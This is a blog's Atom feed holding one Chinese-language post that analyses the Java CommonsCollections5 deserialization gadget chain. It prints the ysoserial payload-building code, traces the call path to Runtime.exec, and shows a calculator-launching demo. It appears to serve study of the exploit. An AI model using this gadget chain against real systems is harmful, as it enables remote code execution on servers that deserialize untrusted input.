<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hi, I&#39;m Arm!tage.</title>
  
  
  <link href="https://an0th3r.github.io/atom.xml" rel="self"/>
  
  <link href="https://an0th3r.github.io/"/>
  <updated>2022-04-25T02:24:20.504Z</updated>
  <id>https://an0th3r.github.io/</id>
  
  <author>
    <name>Arm!tage</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CommonsCollections5</title>
    <link href="https://an0th3r.github.io/CommonsCollections5/"/>
    <id>https://an0th3r.github.io/CommonsCollections5/</id>
    <published>2022-04-25T02:24:20.000Z</published>
    <updated>2022-04-25T02:24:20.504Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CC5链源代码"><a href="#CC5链源代码" class="headerlink" title="CC5链源代码"></a>CC5链源代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> BadAttributeValueExpException <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 创建一个字符串数组存储要执行的命令</span></span><br><span class="line">    <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125; ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125; ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, execArgs),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) </span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    Reflections.setAccessible(valfield);</span><br><span class="line">    valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC5链构成过程"><a href="#CC5链构成过程" class="headerlink" title="CC5链构成过程"></a>CC5链构成过程</h2><p>根据ysoserial在源代码中的注释，方便我们对payload的理解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">      ObjectInputStream.readObject()</span><br><span class="line">          BadAttributeValueExpException.readObject()</span><br><span class="line">              TiedMapEntry.toString()</span><br><span class="line">                  LazyMap.get()</span><br><span class="line">                      ChainedTransformer.transform()</span><br><span class="line">                          ConstantTransformer.transform()</span><br><span class="line">                          InvokerTransformer.transform()</span><br><span class="line">                              Method.invoke()</span><br><span class="line">                                  Class.getMethod()</span><br><span class="line">                          InvokerTransformer.transform()</span><br><span class="line">                              Method.invoke()</span><br><span class="line">                                  Runtime.getRuntime()</span><br><span class="line">                          InvokerTransformer.transform()</span><br><span class="line">                              Method.invoke()</span><br><span class="line">                                  Runtime.exec()</span><br></pre></td></tr></table></figure><p>在程序执行<code>ObjectInputStream.readObject()</code>，进入反序列化过程。整个Gadget构建在<code>BadAttributeValue</code>下，也是通过该对象的反序列化构建出命令执行过程，跟入<code>BadAttributeValue</code>中</p><p><img src="/CommonsCollections5/BadAttributeValueExpException_readObject.png" alt="Untitled"></p><p>在72通过<code>get</code>方法获取<code>val</code>的值，该获取的值在经历一系列类型判断后调用该对象的<code>toString</code>方法。根据源代码，我们知道valObj的类型为<code>TiedMapEntry</code></p><p><img src="/CommonsCollections5/TiedMapEntry_toString.png" alt="Untitled"></p><p>在<code>toString</code>方法中，调用了<code>getKey</code>与<code>getValue</code>方法，跟进<code>getValue</code>，它调用了Map接口中的get方法。</p><p><img src="/CommonsCollections5/LazyMap_get.png" alt="Untitled"></p><p>而<code>LazyMap</code>继承<code>AbstractMapDecorator</code>实现了Map接口，并实现了get方法</p><p><img src="/CommonsCollections5/get.png" alt="Untitled"></p><p>在执行get方法过程中会执行<code>factory.transform</code>，跟进factory的定义，它通过源代码中<code>final Map lazyMap = LazyMap.decorate(innerMap, transformerChain)</code>声明，根据传入的transformerChain的类型可知其为<code>ChainedTransformer</code>。跟进<code>ChainedTransformer</code>中的<code>transform</code>方法，它遍历执行了传入的object</p><p><img src="/CommonsCollections5/ChainedTransformer_transform.png" alt="Untitled"></p><h2 id="CC中类的解释"><a href="#CC中类的解释" class="headerlink" title="CC中类的解释"></a>CC中类的解释</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>Transformer是一个接口，定义了一个transform方法</p><p><img src="/CommonsCollections5/Transformer_interface.png" alt="Untitled"></p><h3 id="functors-ChainedTransformer"><a href="#functors-ChainedTransformer" class="headerlink" title="functors.ChainedTransformer"></a>functors.ChainedTransformer</h3><p>实现Transformer链式调用，通过一个Transformer数组</p><p><strong>构造函数</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/CommonsCollections5/ChainedTransformer_transform.png" alt="Untitled"></p><p>在transform方法通过遍历Transformer数组每个对象，并调用每个对象的transform方法</p><h3 id="functors-InvokerTransformer"><a href="#functors-InvokerTransformer" class="headerlink" title="functors.InvokerTransformer"></a>functors.InvokerTransformer</h3><p>利用Java反射机制创建类实例，在该类中有如下几个函数</p><p><strong>构造函数InvokerTransformer</strong></p><p><img src="/CommonsCollections5/InvokerTransformer.png" alt="Untitled"></p><p><strong>核心类方法 transform</strong></p><p><img src="/CommonsCollections5/InvokerTransformer_transform.png" alt="Untitled"></p><p>通过这个类方法，我们可以直接实例化各种类，并传入任意参数，所以就可以直接构造命令执行实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure><h3 id="functors-ContantTransformer"><a href="#functors-ContantTransformer" class="headerlink" title="functors.ContantTransformer"></a>functors.ContantTransformer</h3><p>每次返回相同常量</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CC5链源代码&quot;&gt;&lt;a href=&quot;#CC5链源代码&quot; class=&quot;headerlink&quot; title=&quot;CC5链源代码&quot;&gt;&lt;/a&gt;CC5链源代码&lt;/h2&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;</summary>
      
    
    
    
    
  </entry>
  
</feed>
